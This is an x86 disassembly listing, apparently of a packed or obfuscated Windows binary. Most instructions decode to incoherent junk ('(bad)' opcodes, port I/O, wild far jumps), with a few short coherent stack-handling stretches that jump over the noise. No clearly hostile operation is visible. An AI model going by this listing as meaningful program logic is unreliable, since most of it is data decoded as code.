  402167:	mov    ch,0x76
  402169:	xchg   ch,bl
  40216b:	jmp    0x7e423fb8
  402170:	jle    0x40216c
  402172:	jg     0x4021f2
  402174:	jle    0x40211d
  402176:	push   0x37
  402178:	or     esi,DWORD PTR [esi+ebp*2-0x24]
  40217c:	test   eax,0x578496b
  402181:	imul   edx,DWORD PTR [ecx+0x714dd4c0],0xb
  402188:	int3   
  402189:	out    0x39,al
  40218b:	jbe    0x4021bd
  40218d:	out    dx,eax
  40218e:	mov    esp,DWORD PTR [ecx]
  402190:	or     ah,BYTE PTR [edx-0x3f]
  402193:	or     bh,BYTE PTR [ecx]
  402195:	daa    
  402196:	arpl   bx,si
  402198:	loope  0x4021bc
  40219a:	push   ecx
  40219b:	push   ebx
  40219c:	cdq    
  40219d:	inc    esp
  40219e:	lods   eax,DWORD PTR ds:[esi]
  40219f:	lods   eax,DWORD PTR ds:[esi]
  4021a0:	dec    ecx
  4021a1:	push   es
  4021a2:	xor    eax,0x3991aba0
  4021a7:	push   edx
  4021a8:	and    bh,BYTE PTR [esi]
  4021aa:	(bad)  
  4021ab:	lods   al,BYTE PTR ds:[esi]
  4021ac:	es icebp 
  4021ae:	dec    ebx
  4021af:	repnz push edx
  4021b1:	das    
  4021b2:	imul   esp,ebp,0xffffffad
  4021b5:	sar    DWORD PTR [ecx],cl
  4021b7:	mov    BYTE PTR [edx+0x6da78cd9],bh
  4021bd:	sbb    eax,0x2e411c5e
  4021c2:	add    BYTE PTR [ecx],al
  4021c4:	iret   
  4021c5:	pop    ebx
  4021c6:	aaa    
  4021c7:	or     BYTE PTR [ebp-0x75],bh
  4021ca:	adc    esi,DWORD PTR [ebx+0x23]
  4021cd:	out    0xdb,al
  4021cf:	scas   al,BYTE PTR es:[edi]
  4021d0:	rcr    ebp,cl
  4021d2:	leave  
  4021d3:	ins    BYTE PTR es:[edi],dx
  4021d4:	adc    esi,eax
  4021d6:	push   ss
  4021d7:	sub    eax,0x92769fc1
  4021dc:	adc    DWORD PTR [esi-0x7ca5a6c5],esi
  4021e2:	inc    ebx
  4021e3:	fs push ds
  4021e5:	fbstp  TBYTE PTR [eax]
  4021e7:	out    dx,al
  4021e8:	sub    eax,0x874ed02b
  4021ed:	cwde   
  4021ee:	jmp    0x6ac9:0x8c5dbf50
  4021f5:	sub    eax,0x15144892
  4021fa:	inc    esp
  4021fb:	not    DWORD PTR [esi+ebx*2]
  4021fe:	int3   
  4021ff:	ins    BYTE PTR es:[edi],dx
  402200:	xor    al,0x63
  402202:	inc    ebx
  402203:	pop    eax
  402204:	dec    esi
  402205:	adc    DWORD PTR [eax],0xe8ad5d43
  40220b:	fld    TBYTE PTR [ecx+edi*4-0x31b18f5b]
  402212:	xlat   BYTE PTR ds:[ebx]
  402213:	jmp    0x402224
  402215:	cld    
  402216:	add    al,0x74
  402218:	(bad)  
  402219:	cmp    ebx,ebx
  40221b:	icebp  
  40221c:	fmul   DWORD PTR [ebx+ebp*2-0x76519a16]
  402223:	inc    ebx
  402224:	xlat   BYTE PTR ds:[ebx]
  402225:	pusha  
  402226:	lock call 0x712c:0x1ec2d3b
  40222e:	xchg   DWORD PTR [ebp-0x6a],ebp
  402231:	sbb    DWORD PTR [ebp+eax*2+0x68],ebp
  402235:	outs   dx,BYTE PTR ds:[esi]
  402236:	mov    ah,0x5
  402238:	(bad)  
  402239:	sbb    al,0x18
  40223b:	aam    0x67
  40223d:	inc    ebx
  40223e:	arpl   WORD PTR [esi-0x51],si
  402241:	fwait
  402242:	int    0x11
  402244:	hlt    
  402245:	lods   eax,DWORD PTR ds:[esi]
  402246:	mov    al,BYTE PTR [eax+0x3]
  402249:	xchg   DWORD PTR [ebx-0x4dd59f21],ebx
  40224f:	call   0xf6ee84fe
  402254:	pop    es
  402255:	(bad)  
  402257:	hlt    
  402258:	rcl    BYTE PTR [edx],0x2e
  40225b:	sar    BYTE PTR [edi+0x72],1
  40225e:	int3   
  40225f:	lea    ebx,[eax]
  402261:	xor    DWORD PTR [ebx+0x3a99516c],ebp
  402267:	fmul   QWORD PTR [ebp-0x217588ae]
  40226d:	repz scas al,BYTE PTR es:[edi]
  40226f:	mov    ecx,0xf778b36a
  402274:	xor    DWORD PTR [ecx+0x198454e6],ebp
  40227a:	dec    edi
  40227b:	fidivr WORD PTR [edx+0x52]
  40227e:	mov    ecx,0x48631e8c
  402283:	xchg   esi,eax
  402284:	data16 out 0x38,al
  402287:	mov    dh,0xc0
  402289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40228a:	pop    ds
  40228b:	push   ebp
  40228c:	sub    dh,BYTE PTR [edi]
  40228e:	push   0x28
  402290:	sub    DWORD PTR [ebx+esi*8+0x7ffb16c4],edx
  402297:	mov    al,ds:0x5e71d07b
  40229c:	aaa    
  40229d:	and    BYTE PTR [edi+0x6c],al
  4022a0:	lds    esp,FWORD PTR [ecx]
  4022a2:	test   DWORD PTR [esi+edx*2-0x617fc9f7],0x7586e94f
  4022ad:	add    DWORD PTR [ecx+ebx*1-0x77],0xffffffc6
  4022b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022b3:	mov    eax,DWORD PTR [ecx*4+0x48f79839]
  4022ba:	inc    eax
  4022bb:	cwde   
  4022bc:	jge    0x4022d7
  4022be:	mov    dh,0xd
  4022c0:	inc    ebp
  4022c1:	inc    esi
  4022c2:	test   eax,0x20f366d3
  4022c7:	add    BYTE PTR [edi-0x65],cl
  4022ca:	iret   
  4022cb:	test   al,0xbb
  4022cd:	jne    0x402267
  4022cf:	rol    BYTE PTR [ebx],0xb6
  4022d2:	push   0xc8d2295
  4022d7:	xor    al,0xe4
  4022d9:	popf   
  4022da:	pop    edx
  4022db:	jecxz  0x402334
  4022dd:	mov    ecx,0x87df0aaa
  4022e2:	sar    BYTE PTR [ecx],0x3b
  4022e5:	inc    ebx
  4022e6:	push   ecx
  4022e7:	cmp    al,0xee
  4022e9:	inc    ebp
  4022ea:	int    0x6
  4022ec:	fst    QWORD PTR ds:0xdf851024
  4022f2:	icebp  
  4022f3:	mov    ebp,0x18f69c76
  4022f8:	and    eax,0xe8458b50
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	push   ss
  402358:	sub    esp,eax
  40235a:	or     eax,0x7e7e039a
  40235f:	cli    
  402360:	jg     0x4023e0
  402362:	jle    0x402392
  402364:	cs (bad) 
  402366:	mov    ds:0x8da4d273,al
  40236b:	mov    edx,0x79279dc
  402370:	clc    
  402371:	add    al,0x65
  402373:	imul   edx,DWORD PTR [ebx],0xffffffcd
  402376:	int    0xea
  402378:	mov    ebp,0x5b243d72
  40237d:	mov    ebx,0xf7ab7058
  402382:	arpl   sp,bp
  402384:	pop    es
  402385:	sbb    edx,esp
  402387:	es push ecx
  402389:	pop    edx
  40238a:	ss jns 0x40233d
  40238d:	outs   dx,DWORD PTR ds:[esi]
  40238e:	out    0x1d,al
  402390:	push   es
  402391:	test   BYTE PTR [edi-0x7d850249],0x6
  402398:	jae    0x4023ca
  40239a:	cdq    
  40239b:	dec    edi
  40239c:	and    ebp,DWORD PTR [ecx+0x2e]
  40239f:	aad    0x60
  4023a1:	retf   
  4023a2:	jmp    0x4023b9
  4023a4:	outs   dx,DWORD PTR ds:[esi]
  4023a5:	(bad)  
  4023a7:	js     0x4023cd
  4023a9:	clc    
  4023aa:	das    
  4023ab:	dec    esi
  4023ac:	aad    0x5e
  4023ae:	mov    al,ds:0x4da3f688
  4023b3:	call   0x11218742
  4023b8:	test   esi,0xb2776597
  4023be:	add    DWORD PTR [edx+0x4f],ecx
  4023c1:	loop   0x40236d
  4023c3:	nop
  4023c4:	xchg   esp,eax
  4023c5:	pop    edx
  4023c6:	daa    
  4023c7:	daa    
  4023c8:	pop    edi
  4023c9:	xor    DWORD PTR [eax],0xb4b597c2
  4023cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023d0:	out    0xba,eax
  4023d2:	push   esp
  4023d3:	cli    
  4023d4:	mov    DWORD PTR [edx],eax
  4023d6:	int3   
  4023d7:	aas    
  4023d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023d9:	push   ss
  4023da:	xor    cl,BYTE PTR [edx]
  4023dc:	or     BYTE PTR [esi],dh
  4023de:	mov    edi,0x906a6f57
  4023e3:	clc    
  4023e4:	pop    esi
  4023e5:	cld    
  4023e6:	and    eax,0x3a963ffc
  4023eb:	adc    al,0x5f
  4023ed:	add    al,0x8b
  4023ef:	aam    0xd5
  4023f1:	fdiv   DWORD PTR [edi+0x38fdb6d3]
  4023f7:	mov    ah,0x50
  4023f9:	adc    bh,BYTE PTR [ebx-0x62]
  4023fc:	rol    BYTE PTR [eax-0x72],1
  4023ff:	cmp    eax,0x36ed69ef
  402404:	cwde   
  402405:	push   edx
  402406:	push   edx
  402407:	fnstenv [esi]
  402409:	(bad)  
  40240a:	iret   
  40240b:	inc    esp
  40240c:	sbb    dl,BYTE PTR [ebx]
  40240e:	test   BYTE PTR [ebx+0x1391da5],bl
  402414:	out    dx,eax
  402415:	lock fldcw WORD PTR cs:[eax-0x5b]
  40241a:	sub    eax,0x5a253115
  40241f:	mov    ah,0x5d
  402421:	fcomi  st,st(2)
  402423:	jle    0x4023b5
  402425:	xor    DWORD PTR [edx],edx
  402427:	push   eax
  402428:	xchg   edi,eax
  402429:	xor    cl,BYTE PTR cs:[edx]
  40242c:	(bad)  
  40242d:	fadd   DWORD PTR [edx]
  40242f:	mov    eax,ds:0xb91110a4
  402434:	lds    edi,FWORD PTR [ebp-0x4201b0d5]
  40243a:	out    0x58,al
  40243c:	cmc    
  40243d:	adc    al,BYTE PTR [edi-0xe]
  402440:	cmp    al,0x8f
  402442:	push   edx
  402443:	or     eax,0xdb42339d
  402448:	push   ebx
  402449:	mov    ds:0x96cec5ba,eax
  40244e:	sub    BYTE PTR ds:0x7f076474,bh
  402454:	out    0x55,eax
  402456:	sbb    eax,0x59d087d4
  40245b:	mov    al,0x46
  40245d:	xor    al,0x28
  40245f:	addr16 (bad) 
  402461:	stc    
  402462:	es xchg ebp,eax
  402464:	jb     0x402455
  402466:	mov    bh,0xd
  402468:	sbb    al,0x38
  40246a:	sbb    al,0x9
  40246c:	xchg   BYTE PTR [ecx+edx*1],dh
  40246f:	adc    DWORD PTR [ecx-0x76],edx
  402472:	(bad)  
  402473:	jl     0x40241e
  402475:	mov    al,ds:0x4a736bef
  40247a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40247b:	(bad)  
  40247c:	pop    ss
  40247d:	sub    ah,BYTE PTR [edx-0xc958b52]
  402483:	push   ecx
  402484:	out    0x3c,eax
  402486:	repnz in eax,0x1e
  402489:	shl    bl,cl
  40248b:	cmp    al,0x47
  40248d:	mov    ebp,0xbe2f837d
  402492:	mov    al,0x1e
  402494:	loopne 0x4024dd
  402496:	pop    ebx
  402497:	dec    DWORD PTR ds:0x45dbde7b
  40249d:	cmp    eax,DWORD PTR [ecx]
  40249f:	ins    DWORD PTR es:[edi],dx
  4024a0:	jbe    0x4024e9
  4024a2:	mov    dl,0x6c
  4024a4:	add    BYTE PTR [edx+ebx*2],ah
  4024a7:	adc    eax,0x4a8940e6
  4024ac:	inc    edx
  4024ad:	popf   
  4024ae:	aaa    
  4024af:	cmp    eax,0x76d84967
  4024b4:	call   0x8478d226
  4024b9:	(bad)  
  4024ba:	mov    ah,0x92
  4024bc:	lahf   
  4024bd:	dec    edx
  4024be:	int    0xcb
  4024c0:	push   ebp
  4024c1:	ss loopne 0x4024db
  4024c4:	mov    al,0x12
  4024c6:	hlt    
  4024c7:	in     eax,0x6f
  4024c9:	fwait
  4024ca:	cmp    ch,bl
  4024cc:	ss mov ecx,0xed32a684
  4024d2:	test   bh,ah
  4024d4:	hlt    
  4024d5:	mov    esi,0x963bb029
  4024da:	dec    ebx
  4024db:	pop    ebx
  4024dc:	in     eax,dx
  4024dd:	int3   
  4024de:	and    DWORD PTR [esi+0x783b9932],esi
  4024e4:	jle    0x40255e
  4024e6:	aad    0x8b
  4024e8:	inc    ebp
  4024e9:	lock mov DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	sub    BYTE PTR [ebp+0x60],dh
  402510:	add    ah,BYTE PTR [esi]
  402512:	add    DWORD PTR [esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x402526
  40251a:	mov    gs,WORD PTR [edi+0x230ad502]
  402520:	jno    0x4024d4
  402522:	enter  0x12f7,0x4d
  402526:	icebp  
  402527:	add    ah,BYTE PTR [ecx]
  402529:	mov    eax,DWORD PTR [ebp+0x18]
  40252c:	int    0xb1
  40252e:	ret    
  40252f:	neg    BYTE PTR [edi]
  402531:	ins    DWORD PTR es:[edi],dx
  402532:	into   
  402533:	adc    ecx,eax
  402535:	and    eax,0xb9e664a4
  40253a:	lods   al,BYTE PTR ds:[esi]
  40253b:	xor    ah,al
  40253d:	cmp    DWORD PTR [edx-0x22],esp
  402540:	fwait
  402541:	xchg   ebx,eax
  402542:	rcl    esi,1
  402544:	test   DWORD PTR [eax-0x3e],esi
  402547:	ins    DWORD PTR es:[edi],dx
  402548:	mov    al,ds:0x4d5b167a
  40254d:	ds stos BYTE PTR es:[edi],al
  40254f:	adc    BYTE PTR [ecx+esi*1-0x69],0xf0
  402554:	add    esi,edx
  402556:	cmp    bl,BYTE PTR [eax+edi*8+0x62e8ed99]
  40255d:	mov    ch,0x4d
  40255f:	(bad)  
  402561:	add    eax,0x9273f532
  402566:	push   0x825b3262
  40256b:	fucom  st(5)
  40256d:	out    0xfe,al
  40256f:	ret    0xd8b8
  402572:	push   edx
  402573:	test   BYTE PTR [edx-0x24a17c84],bh
  402579:	dec    edi
  40257a:	ss pop ebp
  40257c:	adc    al,0x56
  40257e:	ret    0x13d8
  402581:	push   cs
  402582:	xchg   esi,eax
  402583:	fcmove st,st(1)
  402585:	sub    DWORD PTR [edi-0xa],ecx
  402588:	and    al,0x0
  40258a:	jg     0x402537
  40258c:	pop    ebx
  40258d:	push   DWORD PTR [esi+0x60]
  402590:	das    
  402591:	push   edx
  402592:	pusha  
  402593:	mov    al,BYTE PTR [edi+0x544b3fbd]
  402599:	mov    edi,0x2c7872fa
  40259e:	sub    DWORD PTR [esi-0x4dc0dfa0],edx
  4025a4:	icebp  
  4025a5:	adc    al,BYTE PTR [eax-0x1d]
  4025a8:	inc    edi
  4025a9:	mov    ds:0xcc129d67,al
  4025ae:	push   esi
  4025af:	or     DWORD PTR [edx-0x49ad46a7],ebx
  4025b5:	dec    eax
  4025b6:	icebp  
  4025b7:	inc    edi
  4025b8:	xchg   ecx,eax
  4025b9:	jmp    0x6faea7b3
  4025be:	lea    edi,[ebx-0x2d]
  4025c1:	sahf   
  4025c2:	mov    esi,0x72b245d
  4025c7:	loopne 0x402605
  4025c9:	and    DWORD PTR [edx],eax
  4025cb:	pop    edx
  4025cc:	mov    al,ds:0xb42d0813
  4025d1:	dec    esi
  4025d2:	inc    esp
  4025d3:	add    al,0x16
  4025d5:	push   eax
  4025d6:	enter  0xa507,0x75
  4025da:	nop
  4025db:	std    
  4025dc:	clc    
  4025dd:	xchg   ebx,eax
  4025de:	mov    eax,0x6fbb687a
  4025e3:	push   edi
  4025e4:	jge    0x402619
  4025e6:	(bad)  
  4025e7:	adc    DWORD PTR [ecx+0x9a4e8b],esp
  4025ed:	push   esp
  4025ee:	aam    0x60
  4025f0:	cmp    eax,0x5de2cb13
  4025f5:	jno    0x402615
  4025f7:	pop    esp
  4025f8:	leave  
  4025f9:	in     al,0x78
  4025fb:	mov    ds:0xdda8bb4,eax
  402600:	and    DWORD PTR [ebx+0x72],eax
  402603:	dec    ecx
  402604:	pop    esi
  402605:	fcomi  st,st(2)
  402607:	add    dh,BYTE PTR [ecx]
  402609:	adc    ebp,DWORD PTR [esi-0x72]
  40260c:	mov    edx,0x66a94c31
  402612:	cmp    DWORD PTR [eax],edx
  402614:	jg     0x40263c
  402616:	cmp    al,0x22
  402618:	mov    edi,cs
  40261a:	sbb    BYTE PTR [edx+edx*2],bh
  40261d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40261e:	fsub   QWORD PTR [edx]
  402620:	push   ebp
  402621:	jns    0x4025fc
  402623:	mov    WORD PTR [ebx],?
  402625:	test   BYTE PTR [eax-0x25],bh
  402628:	push   es
  402629:	shl    dh,0xc3
  40262c:	dec    ebp
  40262d:	xor    ecx,eax
  40262f:	xchg   edx,eax
  402630:	jge    0x402610
  402632:	int    0xc5
  402634:	shl    BYTE PTR [esi],1
  402636:	sub    edi,DWORD PTR [ebp+0x53ac5cd6]
  40263c:	mov    cl,cl
  40263e:	loope  0x40266f
  402640:	dec    ebp
  402641:	push   eax
  402642:	shl    ecx,1
  402644:	inc    ecx
  402645:	btc    edx,ebp
  402648:	mov    dl,0x1d
  40264a:	aad    0xb8
  40264c:	sahf   
  40264d:	je     0x4025e6
  40264f:	add    eax,0x5347bda1
  402654:	out    0xf2,al
  402656:	pop    ss
  402657:	or     BYTE PTR [edx+0x559d9ed],al
  40265d:	adc    dh,BYTE PTR [esi-0x21a03df5]
  402663:	cmp    eax,0x3044c6bd
  402668:	jge    0x40263d
  40266a:	push   ebp
  40266b:	shl    DWORD PTR [esi+0x41],1
  40266e:	pop    ecx
  40266f:	xchg   ebp,eax
  402670:	hlt    
  402671:	(bad)  
  402672:	xchg   ebx,eax
  402673:	loopne 0x4026dd
  402675:	jne    0x402687
  402677:	(bad)  
  402678:	div    BYTE PTR [edx]
  40267a:	stos   DWORD PTR es:[edi],eax
  40267b:	or     al,0x67
  40267d:	push   ss
  40267e:	leave  
  40267f:	cmp    al,0xd5
  402681:	out    0x73,al
  402683:	(bad)  
  402684:	mov    BYTE PTR [eax+0x32c19804],dh
  40268a:	jge    0x40262e
  40268c:	push   cs
  40268d:	mov    ch,0xa6
  40268f:	ins    DWORD PTR es:[edi],dx
  402690:	shl    BYTE PTR cs:[ecx+esi*4+0x6e],cl
  402695:	xchg   ebx,eax
  402696:	pop    esp
  402697:	cmc    
  402698:	outs   dx,BYTE PTR ds:[esi]
  402699:	adc    eax,0x33cee917
  40269e:	mov    BYTE PTR ds:0x32729b,0x89
  4026a5:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  4026ab:	clc    
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026d3:	push   edx
  4026d4:	fwait
  4026d5:	dec    edx
  4026d6:	mov    ds:0xfa7e7e0e,al
  4026db:	jg     0x40275b
  4026dd:	jle    0x402677
  4026df:	sti    
  4026e0:	pop    edx
  4026e1:	fcmovb st,st(3)
  4026e3:	ins    BYTE PTR es:[edi],dx
  4026e4:	pop    ebp
  4026e5:	inc    esi
  4026e6:	les    esi,FWORD PTR [esi]
  4026e8:	leave  
  4026e9:	nop
  4026ea:	pop    edx
  4026eb:	aad    0xf4
  4026ed:	hlt    
  4026ee:	gs out dx,al
  4026f0:	cmp    DWORD PTR [ecx],edx
  4026f2:	fist   DWORD PTR [ecx-0x1227d393]
  4026f8:	jno    0x4026cc
  4026fa:	out    0x71,al
  4026fc:	ins    BYTE PTR es:[edi],dx
  4026fd:	sub    BYTE PTR [edi],ah
  4026ff:	push   0x9adcb91d
  402704:	ja     0x4026b1
  402706:	das    
  402707:	pusha  
  402708:	dec    ebx
  402709:	lahf   
  40270a:	and    bl,bl
  40270c:	mov    al,0xb8
  40270e:	mov    ds:0xa44aa72d,eax
  402713:	rcl    BYTE PTR [edx],1
  402715:	mov    dl,BYTE PTR [eax+0x65]
  402718:	scas   al,BYTE PTR es:[edi]
  402719:	aam    0x72
  40271b:	nop
  40271c:	(bad)  
  40271d:	mov    ebp,0xd662ff47
  402722:	adc    BYTE PTR [edi-0x7f],ch
  402725:	pop    ecx
  402726:	aad    0x9f
  402728:	push   esi
  402729:	pop    ds
  40272a:	pop    ds
  40272b:	xlat   BYTE PTR ds:[ebx]
  40272c:	jge    0x4026ef
  40272e:	cs mov ebp,0x317148c3
  402734:	push   ds
  402735:	out    0x50,eax
  402737:	xor    edi,ebp
  402739:	into   
  40273a:	inc    ecx
  40273b:	in     eax,0x25
  40273d:	loope  0x4026fa
  40273f:	pop    ebx
  402740:	or     DWORD PTR [esi+0x1101955a],ebp
  402746:	popa   
  402747:	pusha  
  402748:	repz mov esp,0x2b5c5c36
  40274e:	fimul  WORD PTR [ecx-0x5a1f8a3b]
  402754:	adc    DWORD PTR [edi+0x7e],0xffffffd3
  402758:	mov    ebp,0xdd84af31
  40275d:	in     eax,0xa2
  40275f:	hlt    
  402760:	xchg   DWORD PTR [ebx],ebp
  402762:	arpl   WORD PTR [edx+edi*2-0x14],dx
  402766:	dec    esp
  402767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402768:	jmp    0x56119f13
  40276d:	nop
  40276e:	xor    edx,DWORD PTR [eax+ebp*2-0x43]
  402772:	mov    dh,BYTE PTR [edx]
  402774:	adc    ebp,DWORD PTR [edi+0x3b]
  402777:	aad    0x37
  402779:	xchg   ecx,eax
  40277a:	pop    ss
  40277b:	xchg   esp,eax
  40277c:	jp     0x402775
  40277e:	fistp  QWORD PTR [ecx]
  402780:	jmp    0x402703
  402782:	js     0x402760
  402784:	retf   0x6a29
  402787:	daa    
  402788:	mov    ch,0xa0
  40278a:	scas   al,BYTE PTR es:[edi]
  40278b:	xor    eax,0xddecc863
  402790:	out    dx,eax
  402791:	push   ecx
  402792:	sbb    ebx,ecx
  402794:	pop    eax
  402795:	sbb    BYTE PTR [ebx-0x2e],dl
  402798:	in     al,dx
  402799:	xchg   esp,eax
  40279a:	add    BYTE PTR [ebp-0x4f],bh
  40279d:	and    al,0xfb
  40279f:	jbe    0x40277e
  4027a1:	jns    0x4027fc
  4027a3:	add    eax,0x8bb23f62
  4027a8:	int3   
  4027a9:	cdq    
  4027aa:	xchg   esi,eax
  4027ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027ac:	push   0x1cc0bf41
  4027b1:	xchg   esi,eax
  4027b2:	fidivr WORD PTR [ebx-0x4f737f4d]
  4027b8:	and    ch,BYTE PTR [edx-0x12]
  4027bb:	lock cmp eax,0x56e6d096
  4027c1:	aaa    
  4027c2:	popf   
  4027c3:	jo     0x40275a
  4027c5:	xchg   esi,eax
  4027c6:	xor    BYTE PTR [edx+0x11c8aea9],cl
  4027cc:	xchg   ecx,eax
  4027cd:	cs stos BYTE PTR es:[edi],al
  4027cf:	mov    al,ds:0x28105ae6
  4027d4:	and    bl,bl
  4027d6:	xchg   esp,ecx
  4027d8:	leave  
  4027d9:	das    
  4027da:	bound  ebp,QWORD PTR [ebx+0x5f]
  4027dd:	xchg   esi,eax
  4027de:	lods   eax,DWORD PTR ds:[esi]
  4027df:	jmp    0x4027b1
  4027e1:	add    al,0x9f
  4027e3:	enter  0x36a4,0xd8
  4027e7:	dec    edx
  4027e8:	test   DWORD PTR [ecx+0x74],esp
  4027eb:	loopne 0x402829
  4027ed:	jne    0x4027d1
  4027ef:	mov    ?,esi
  4027f1:	shl    edx,cl
  4027f3:	jp     0x4027bb
  4027f5:	sub    al,0xe2
  4027f7:	leave  
  4027f8:	dec    ecx
  4027f9:	lock mov dl,0x68
  4027fc:	sub    al,0xbc
  4027fe:	arpl   ax,di
  402800:	sub    eax,0xed8bd196
  402805:	xchg   DWORD PTR [ebp-0x47ff1949],ebp
  40280b:	arpl   WORD PTR [eax-0x3f36d62c],ax
  402811:	loopne 0x4027e6
  402813:	push   ds
  402814:	(bad)  
  402816:	xor    DWORD PTR [edi+0x6b231718],eax
  40281c:	lods   eax,DWORD PTR ds:[esi]
  40281d:	pop    eax
  40281e:	fsubrp st(1),st
  402820:	lods   eax,DWORD PTR ds:[esi]
  402821:	xchg   ebp,eax
  402822:	sbb    cl,BYTE PTR [ecx+0x7630b8f5]
  402828:	imul   edx,esp,0xd12a03d7
  40282e:	outs   dx,DWORD PTR ds:[esi]
  40282f:	aas    
  402830:	adc    ch,BYTE PTR [eax]
  402832:	xchg   ecx,eax
  402833:	retf   0xbc32
  402836:	inc    esp
  402837:	int    0x28
  402839:	mov    BYTE PTR [ebx],dh
  40283b:	clc    
  40283c:	dec    eax
  40283d:	jg     0x4027e8
  40283f:	mov    dh,0xc5
  402841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402842:	in     al,dx
  402843:	or     eax,0x82421e60
  402848:	or     esi,esp
  40284a:	sub    BYTE PTR [edx+0x18],0x45
  40284e:	js     0x40284a
  402850:	fimul  WORD PTR [esi+0x57]
  402853:	or     al,0x67
  402855:	mov    bl,0x37
  402857:	scas   eax,DWORD PTR es:[edi]
  402858:	out    dx,al
  402859:	stc    
  40285a:	pop    es
  40285b:	dec    esp
  40285c:	add    DWORD PTR [edx],eax
  40285e:	xor    ah,BYTE PTR [esi+0x458b9065]
  402864:	ror    BYTE PTR [ebx+0x4189f84d],1
  40286a:	adc    BYTE PTR [ebx-0x23ba7440],cl
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	xchg   DWORD PTR [esi+0xd],ecx
  402886:	out    dx,eax
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x4028ce
  402890:	les    esi,FWORD PTR [esi]
  402892:	fwait
  402893:	dec    ecx
  402894:	xor    eax,0xb6e21fce
  402899:	mov    bl,0x23
  40289b:	cmc    
  40289c:	mov    cl,bl
  40289e:	inc    ecx
  40289f:	ror    DWORD PTR [edx-0x69cf425f],0xb8
  4028a6:	or     eax,0x72769fdb
  4028ab:	(bad)  
  4028ad:	xlat   BYTE PTR ds:[ebx]
  4028ae:	addr16 leave 
  4028b0:	test   DWORD PTR [esi+0x20d65b9],ecx
  4028b6:	fstp   st(7)
  4028b8:	jb     0x402893
  4028ba:	adc    eax,0xfbe8b256
  4028bf:	xchg   ebp,eax
  4028c0:	xor    eax,0xd2fb81ed
  4028c5:	fsubr  QWORD PTR [edi-0x74]
  4028c8:	mov    esi,0x2d3481b1
  4028cd:	mov    dh,0x6a
  4028cf:	inc    edx
  4028d0:	push   0xfffffff0
  4028d2:	inc    esp
  4028d3:	sub    edx,DWORD PTR [ebp+0x68d420f3]
  4028d9:	xchg   ebp,eax
  4028da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028dc:	clc    
  4028dd:	add    eax,edx
  4028df:	push   eax
  4028e0:	enter  0x339b,0xdd
  4028e4:	sbb    DWORD PTR [ecx+0x31],0x31042161
  4028eb:	jle    0x4028e7
  4028ed:	in     eax,0xdb
  4028ef:	out    0x94,al
  4028f1:	scas   eax,DWORD PTR es:[edi]
  4028f2:	mov    ch,0xb2
  4028f4:	mov    dl,0xc7
  4028f6:	je     0x40292e
  4028f8:	pop    eax
  4028f9:	(bad)  
  4028fa:	dec    edx
  4028fb:	cmp    edi,DWORD PTR [ecx+0x4b4668e1]
  402901:	lods   eax,DWORD PTR ds:[esi]
  402902:	pop    eax
  402903:	or     dl,BYTE PTR [ecx+edi*8]
  402906:	add    ebp,edi
  402908:	test   eax,0x1825c438
  40290d:	dec    eax
  40290e:	mov    eax,0xe6a45514
  402913:	xchg   ebp,eax
